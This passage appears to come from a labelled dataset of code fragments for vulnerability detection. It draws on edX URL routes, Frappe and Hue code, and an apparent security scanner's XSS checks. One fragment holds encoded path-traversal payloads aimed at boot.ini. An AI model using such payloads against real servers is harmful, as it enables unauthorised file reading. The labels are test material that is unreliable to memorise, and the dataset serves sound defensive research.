url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$", "label": 0}, {"snippet_id": 32832, "code": ".write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self): self._WriteHeader('text/html', status_code=501) self.wfile.write('<html><body>I do not know how to serve %s.</body>' '", "label": 0}, {"snippet_id": 22548, "code": " if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings", "label": 0}, {"snippet_id": 2226, "code": " \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param", "label": 0}, {"snippet_id": 15744, "code": " terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return ", "label": 0}, {"snippet_id": 11273, "code": ", **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root", "label": 0}, {"snippet_id": 19874, "code": " \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs", "label": 0}, {"snippet_id": 24698, "code": ".generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers", "label": 0}, {"snippet_id": 13134, "code": "'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r", "label": 0}, {"snippet_id": 11344, "code": " \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__", "label": 0}, {"snippet_id": 6976, "code": " name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$',", "label": 0}, {"snippet_id": 21628, "code": ")/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort", "label": 0}, {"snippet_id": 43610, "code": "\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in", "label": 0}, {"snippet_id": 2102, "code": ", \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads", "label": 0}, {"snippet_id": 37235, "code": "(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/", "label": 0}, {"snippet_id": 31651, "code": "\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key,", "label": 0}, {"snippet_id": 53495, "code": " response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id", "label": 0}, {"snippet_id": 29903, "code": "+id] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form", "label": 0}, {"snippet_id": 53023, "code": ").id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission", "label": 0}, {"snippet_id": 4247, "code": " else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters", "label": 0}, {"snippet_id": 49490, "code": " SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices ] elif type(self.model_field)==BooleanField: values=[ SmartFilterValue(self.field_name, choice[1", "label": 0}, {"snippet_id": 21530, "code": "]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 9808, "code": ".provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False)", "label": 0}, {"snippet_id": 24004, "code": " should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\"", "label": 0}, {"snippet_id": 25892, "code": " None, widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text", "label": 0}, {"snippet_id": 39133, "code": " is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local", "label": 0}, {"snippet_id": 21979, "code": " settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 3808, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update", "label": 0}, {"snippet_id": 49185, "code": ".\".join(new_query)) }) else: return self.get_reverse_sort_by() def get_remove_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id", "label": 0}, {"snippet_id": 41591, "code": " display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the", "label": 0}, {"snippet_id": 37105, "code": " comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ ", "label": 0}, {"snippet_id": 660, "code": ": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result)", "label": 1}, {"snippet_id": 45477, "code": ", mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties", "label": 0}, {"snippet_id": 18796, "code": ".DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid", "label": 0}, {"snippet_id": 41732, "code": ".get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key", "label": 0}, {"snippet_id": 32306, "code": " origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args", "label": 0}, {"snippet_id": 30109, "code": ".show_backends(serv) \t if form.getvalue('ip') is not None and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv", "label": 0}, {"snippet_id": 28408, "code": " %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y", "label": 0}, {"snippet_id": 8280, "code": ".provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN',", "label": 0}, {"snippet_id": 37129, "code": "\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format", "label": 0}, {"snippet_id": 20144, "code": " self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses", "label": 0}, {"snippet_id": 2079, "code": "}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header", "label": 0}, {"snippet_id": 7169, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX", "label": 0}, {"snippet_id": 261, "code": " as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 45251, "code": ".POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name']", "label": 0}, {"snippet_id": 27532, "code": ": form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href", "label": 0}, {"snippet_id": 21952, "code": ".provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False)", "label": 0}, {"snippet_id": 8658, "code": ".auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$'", "label": 0}, {"snippet_id": 46587, "code": " collections]) } return JsonResponse(response) def admin_collection_copy(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get(", "label": 0}, {"snippet_id": 18184, "code": "'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r", "label": 0}, {"snippet_id": 17026, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 33857, "code": " name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select", "label": 0}, {"snippet_id": 17036, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 24876, "code": ": return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self", "label": 0}, {"snippet_id": 20084, "code": " BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ", "label": 0}, {"snippet_id": 50349, "code": " self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self, request): \"\"\" This is called by render_POST when the client is sending data to the server. Args: request(Request): Incoming", "label": 0}, {"snippet_id": 54922, "code": "\" projects=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields", "label": 0}, {"snippet_id": 294, "code": ") as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request", "label": 1}, {"snippet_id": 43149, "code": "(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self", "label": 0}, {"snippet_id": 15690, "code": ") ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print ", "label": 0}, {"snippet_id": 2958, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result", "label": 0}, {"snippet_id": 38306, "code": ".blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count", "label": 0}, {"snippet_id": 27520, "code": "}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/logout?' +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): ", "label": 0}, {"snippet_id": 27874, "code": ": exception.message, 'traceDump': traceback.format_exc()} logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')):", "label": 0}, {"snippet_id": 48583, "code": "=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects.get(id=int", "label": 1}, {"snippet_id": 18419, "code": ".index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P", "label": 0}, {"snippet_id": 38078, "code": ".html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: ", "label": 1}, {"snippet_id": 43578, "code": " isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self", "label": 0}, {"snippet_id": 18393, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/", "label": 0}, {"snippet_id": 26721, "code": "%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00", "label": 0}, {"snippet_id": 736, "code": ".replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"", "label": 1}, {"snippet_id": 31085, "code": " form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path", "label": 0}, {"snippet_id": 24477, "code": "', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots", "label": 0}, {"snippet_id": 49271, "code": " self.field_name=field self.label=label self.render_function=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\") and self.field_name ", "label": 0}, {"snippet_id": 34059, "code": "\t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value", "label": 0}, {"snippet_id": 42414, "code": " \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe", "label": 0}, {"snippet_id": 11041, "code": " bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that", "label": 0}, {"snippet_id": 27998, "code": "(self): \"\"\"Handle a get request.\"\"\" self.render( 'login.html',{ 'apiKey': local_config.ProjectConfig().get('firebase.api_key'), 'authDomain': auth.auth_domain(), 'dest': self.request.get('dest'), }) class", "label": 1}, {"snippet_id": 8356, "code": ".view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status", "label": 0}, {"snippet_id": 31353, "code": ".sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta", "label": 0}, {"snippet_id": 37015, "code": "=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category", "label": 0}, {"snippet_id": 37742, "code": "\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t", "label": 0}, {"snippet_id": 21661, "code": "\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 47612, "code": "='dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights:", "label": 0}, {"snippet_id": 24314, "code": "-directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g.,", "label": 0}, {"snippet_id": 15458, "code": ".run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly", "label": 0}, {"snippet_id": 46957, "code": " False @property @cache(MC_KEY_COMMENT_LIST %('{self.id}')) async def comments(self): return await Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}", "label": 0}, {"snippet_id": 37124, "code": "\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image", "label": 0}, {"snippet_id": 13419, "code": ".MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme", "label": 0}, {"snippet_id": 27528, "code": " +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self", "label": 0}, {"snippet_id": 17590, "code": " url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$'", "label": 0}, {"snippet_id": 34289, "code": ", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d)", "label": 0}, {"snippet_id": 16635, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 43543, "code": "))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param", "label": 0}, {"snippet_id": 37178, "code": "('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar", "label": 0}, {"snippet_id": 50089, "code": " del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time() to_remove=[] keep_alives=((csessid, remove) for csessid", "label": 0}, {"snippet_id": 225, "code": " impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": ", "label": 1}, {"snippet_id": 50902, "code": "\nfrom datetime import datetime, timedelta import pytz from constance.admin import Config, ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django", "label": 0}, {"snippet_id": 45089, "code": ".error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators", "label": 0}, {"snippet_id": 2540, "code": ".text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\":", "label": 1}, {"snippet_id": 50340, "code": " by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input(self, request): \"\"\" This", "label": 0}, {"snippet_id": 25939, "code": ".fields['question_%s' % q.id]=field responses=question_form_fields.send(sender=event, position=pos) data=pos.meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for key, value", "label": 0}, {"snippet_id": 31179, "code": " \t if form.getvalue('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable')) \t\t if form.getvalue('table_metrics'): \timport http.cookies \tfrom jinja2 import Environment", "label": 0}, {"snippet_id": 9860, "code": ")$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 24719, "code": " def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in", "label": 0}, {"snippet_id": 40353, "code": " _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t", "label": 0}, {"snippet_id": 27770, "code": ", _): \"\"\"Catch exception and format it properly.\"\"\" try: status=500 values={ 'message': exception.message, 'email': helpers.get_user_email(), 'traceDump': traceback.format_exc(), 'status': status, 'type", "label": 0}, {"snippet_id": 11792, "code": "'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template", "label": 0}, {"snippet_id": 54805, "code": "\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context[", "label": 0}, {"snippet_id": 29591, "code": " \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn", "label": 0}, {"snippet_id": 47635, "code": ".add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen", "label": 0}, {"snippet_id": 25991, "code": ": BusinessBooleanRadio, 'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}), 'beneficiary': forms.Textarea(attrs={'rows': 3}), 'company': forms.TextInput(attrs={'data-display", "label": 0}, {"snippet_id": 51464, "code": ".humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting', 'websecmap.map', 'websecmap.pro', 'dashboard.internet_nl_dashboard", "label": 0}, {"snippet_id": 21056, "code": " notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url", "label": 0}, {"snippet_id": 11218, "code": "(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\"", "label": 0}, {"snippet_id": 11155, "code": "' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.", "label": 0}, {"snippet_id": 10786, "code": " None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS", "label": 1}, {"snippet_id": 28848, "code": ".AuthenticationException: \t\treturn 'Authentication failed, please verify your credentials' \t\tpass \texcept paramiko.SSHException as sshException: \t\treturn 'Unable to establish SSH connection: %s ' % sshException", "label": 0}, {"snippet_id": 32254, "code": ".add_argument('-d', '--directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?'", "label": 0}, {"snippet_id": 38302, "code": "\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name", "label": 0}, {"snippet_id": 46565, "code": ".method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.delete_collections", "label": 0}, {"snippet_id": 18238, "code": "*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 43956, "code": "], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", 